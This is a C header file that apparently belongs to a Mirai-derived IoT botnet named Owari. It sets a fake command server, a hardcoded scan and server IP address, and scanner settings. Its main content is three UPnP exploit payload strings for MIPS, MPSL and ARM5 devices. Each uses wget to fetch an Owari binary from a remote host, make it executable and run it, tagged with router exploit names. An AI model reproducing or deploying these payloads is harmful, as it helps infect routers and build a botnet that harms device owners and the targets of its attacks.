#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define FAKE_CNC_ADDR INET_ADDR(1,1,1,1)
#define FAKE_CNC_PORT 23

#define SCANIP (int)inet_addr((const char*)"147.135.23.229");
#define SERVIP (int)inet_addr((const char*)"147.135.23.229");
#define SCAN_PORT 293

#define UPNP_SCAN_PAYLOAD_MIPS "wget http://147.135.23.229/bins/owari.mips; chmod 777 *; ./owari.mips upnp.dasan"
#define UPNP_SCAN_PAYLOAD_MPSL "wget http://147.135.23.229/bins/owari.mpsl; chmod 777 *; ./owari.mpsl upnp.rompager"
#define UPNP_SCAN_PAYLOAD_ARM5 "wget http://147.135.23.229/bins/owari.arm5; chmod 777 *; ./owari.arm5 upnp.goahead"

ipv4_t LOCAL_ADDR;


